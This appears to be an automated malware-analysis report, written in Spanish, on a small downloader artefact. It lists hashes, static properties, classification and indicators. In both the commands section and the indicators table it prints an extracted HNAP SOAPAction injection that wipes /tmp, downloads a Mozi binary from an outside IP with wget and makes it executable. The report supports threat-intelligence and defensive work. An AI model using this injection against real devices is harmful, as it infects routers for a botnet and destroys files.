# 🧬 Payload Analysis

`c15becdef361e8a1cc06d5a3c2d161098ef67c71fc07d2ffbe5f3dcaa5d74337`

## 📌 Resumen

Artefacto identificado como ASCII text, with very long lines (531), with CRLF line terminators de 794 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `XMLSchema-instance` en `hxxp://www[.]w3[.]org/2001/XMLSchema-instance`. Se extrajeron 5 referencias URL únicas. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T18:42:51.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `c15becdef361e8a1cc06d5a3c2d161098ef67c71fc07d2ffbe5f3dcaa5d74337`
- **MD5:** `a9642b00fa885f551a8b966a350ffcd1`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with very long lines (531), with CRLF line terminators |
| Tamaño | 794 B |
| Entropía | 5.41 |
| Strings | 6 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Cambio de permisos**
3. **Limpieza**

## 🔬 Evidencia de clasificación

- Download indicators (wget/curl + /tmp)

## 🖥️ Comandos observados / extraídos

```text
SOAPAction: hxxp://purenetworks[.]com/HNAP1/`cd /tmp && rm -rf * && wget hxxp://38.100.221.XXX:54704/Mozi.m && chmod 777 /t
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://www[.]w3[.]org/2001/XMLSchema-instance | strings |
| url | hxxp://purenetworks[.]com/HNAP1/ | strings |
| url | hxxp://schemas[.]xmlsoap[.]org/soap/envelope/ | strings |
| url | hxxp://www[.]w3[.]org/2001/XMLSchema | strings |
| url | hxxp://38.100.221.XXX:54704/Mozi.m | strings |
| ip | 38.100.221.XXX | static_analysis |
| ip | 190.179.177.XXX | static_analysis |
| command | SOAPAction: hxxp://purenetworks[.]com/HNAP1/`cd /tmp && rm -rf * && wget hxxp://38.100.221.XXX:54704/Mozi.m && chmod 777 /t | strings |
| hash | c15becdef361e8a1cc06d5a3c2d161098ef67c71fc07d2ffbe5f3dcaa5d74337 | static_analysis |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
